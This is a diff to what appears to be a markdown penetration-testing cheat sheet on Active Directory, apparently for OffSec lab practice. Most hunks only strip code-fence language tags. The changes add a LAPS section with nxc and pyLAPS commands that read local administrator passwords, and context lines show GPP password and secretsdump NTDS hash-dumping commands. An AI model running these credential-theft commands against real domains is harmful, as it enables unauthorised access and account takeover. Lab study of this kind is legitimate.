@@ -1813,7 +1813,7 @@ firefox index.html
 
 - Impacket
 
-```bash
+```
 # with a NULL session
 Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
 
@@ -1829,7 +1829,7 @@ Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
 
 - SMB share - If SYSVOL share or any share which `domain` name as folder name
 
-```bash
+```
 #Download the whole share
 https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
 #Navigate to the downloaded folder
@@ -1940,6 +1940,12 @@ secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
 ```
 secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 #use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
+```
+### LAPS
+```
+nxc ldap 192.168.219.122 -u <username> -p <password> -d hutch.offsec -M laps
+python pyLAPS.py --action get --dc-ip 192.168.212.122 -d "hutch.offsec" -u "<username>" -p "<password>"
+
 ```
 
 ## Lateral Movement in Active Directory
